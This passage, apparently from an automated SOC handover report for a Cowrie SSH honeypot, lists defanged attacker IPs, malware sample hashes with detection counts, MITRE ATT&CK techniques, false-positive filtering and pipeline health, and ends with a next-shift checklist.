| `157.230.150[.]187` | **14** | 2026-06-14 17:37 | 2026-06-14 19:01 | 9m | 0 | `T1592` | 🟠 MEDIUM |
| `103.67.78[.]49` | **11** | 2026-06-14 17:22 | 2026-06-14 17:27 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `27.79.2[.]76` | **7** | 2026-06-14 18:32 | 2026-06-14 18:38 | 1m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `68.183.212[.]68` | **5** | 2026-06-14 17:23 | 2026-06-14 17:29 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `47.251.162[.]176` | **4** | 2026-06-14 18:56 | 2026-06-14 18:56 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `193.176.251[.]229` | **3** | 2026-06-14 18:21 | 2026-06-14 18:34 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `116.99.172[.]35` | **2** | 2026-06-14 18:24 | 2026-06-14 18:24 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `106.41.74[.]24` | 1 | 2026-06-14 17:56 | 2026-06-14 17:57 | 13s | 0 | `T1592` | 🟢 LOW |
| `144.48.243[.]18` | 1 | 2026-06-14 19:19 | 2026-06-14 19:19 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.21.182[.]228` | 1 | 2026-06-14 18:19 | 2026-06-14 18:19 | 30s | 0 | `T1592` | 🟢 LOW |
| `61.7.241[.]149` | 1 | 2026-06-14 18:20 | 2026-06-14 18:20 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]134` | 1 | 2026-06-14 19:33 | 2026-06-14 19:33 | 15s | 0 | `T1592` | 🟢 LOW |
| `71.71.250[.]77` | 1 | 2026-06-14 19:22 | 2026-06-14 19:22 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `116.99.172[.]35` | VN | Viettel Group | **100** ⚠️ | 1 |
| `71.71.250[.]77` | US | Charter Communications Inc | **100** ⚠️ | 4 |
| `157.230.150[.]187` | US | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `27.79.2[.]76` | VN | Viettel Group | **100** ⚠️ | 2 |
| `66.132.172[.]134` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `68.183.212[.]68` | DE | DigitalOcean, LLC | **100** ⚠️ | 8 |
| `64.188.77[.]26` | NL | 1Cent Host | **100** ⚠️ | 31 |
| `193.176.251[.]229` | UA | CHP Poddubny Sergey Valentynovich | **100** ⚠️ | 50 |
| `144.48.243[.]18` | HK | Cloudie Limited | **100** ⚠️ | 50 |
| `103.67.78[.]49` | ID | PT Fazza Multi Transportasi | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 167 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 86 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 52 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 28 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 28 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 7 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 215 cases |
| Tool 34  | Credential Extractor        | ✅ 139 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 19 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (0.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 18 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 52 priority case(s) shown individually · 17 recon entry/entries in table (11 group(s) consolidating 155 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-14T19:42:24Z_
